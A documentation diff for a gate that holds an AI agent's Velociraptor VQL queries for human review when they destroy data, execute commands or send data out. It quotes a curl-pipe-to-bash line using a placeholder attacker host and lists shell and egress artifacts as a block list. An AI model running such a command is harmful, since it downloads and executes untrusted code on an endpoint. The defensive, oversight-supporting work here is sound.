@@ -488,19 +488,45 @@ With that set, each `RunVQLQueryTool` call is classified and weighed against
 a policy before it runs:
 
 - benign read queries — execute as normal
-- queries that match a remediation/mutation pattern (quarantine, uninstall,
-  delete, rekey, cleanup, etc.) — held for a human, not silently run
+- queries held for a human, in three families rather than one:
+  - **destruction** — quarantine, uninstall, delete, rekey, cleanup, …
+  - **execution** — `execve()`, and the built-in artifacts that run a
+    command the caller supplies (`Windows.System.PowerShell`,
+    `Windows.System.CmdShell`, `Linux.Sys.BashShell`,
+    `Windows.System.VBScript`, `Generic.Utils.FetchBinary`)
+  - **egress** — `upload()`, `http_client()`, `copy()`: data leaving the
+    endpoint, or arbitrary outbound network from it
 - every decision either way lands on a tamper-evident, hash-chained audit
-  record (`tulip_gate.audit_trail()`)
+  record (`tulip_gate.audit_trail()`), tagged with which family fired
 
-This was validated against this project's own real 324-artifact built-in
-catalog, not a couple of hand-picked examples — see this feature's PR
-description for the full methodology, including the two false positives
-and two real misses that validation found. It's a keyword-based classifier,
-not a claim of a complete or production-grade risk engine, and there's no
-human-approval-and-resume UI wired up yet — a held query is blocked, full
-stop. Treat this as a starting point for finer-grained control, not a
-finished product.
+The execution and egress families exist because the first version of this
+gate had only the destruction verbs — which meant it held
+`Windows.Remediation.Quarantine` while letting
+`SELECT * FROM execve(argv=["bash","-c","curl http://evil.sh|bash"])`
+through as a benign read. `RunVQLQueryTool` accepts arbitrary VQL, so an
+agent never needs a remediation artifact to do damage.
+
+Validated against real artifact catalogs rather than hand-picked examples:
+this project's own 324-artifact built-in catalog from a live server (see
+the PR description for that methodology, including the two false positives
+and two real misses it found), and — for the marker families added since —
+all 421 artifact definitions in the upstream repo, re-derivable offline:
+
+```bash
+git clone --depth 1 --filter=blob:none --sparse \
+    https://github.com/Velocidex/velociraptor.git /tmp/velo
+cd /tmp/velo && git sparse-checkout set artifacts/definitions
+python scripts/validate_markers.py /tmp/velo/artifacts/definitions
+```
+
+52 of 421 artifact names (12%) would be held if named directly in a query.
+Known false positives are listed in `tulip_gate.py`'s docstring rather than
+tuned away; a gate is judged on what it lets through, not on what it stops.
+
+It's a keyword-based classifier, not a claim of a complete or
+production-grade risk engine, and there's no human-approval-and-resume UI
+wired up yet — a held query is blocked, full stop. Treat this as a starting
+point for finer-grained control, not a finished product.
 
 ---
 
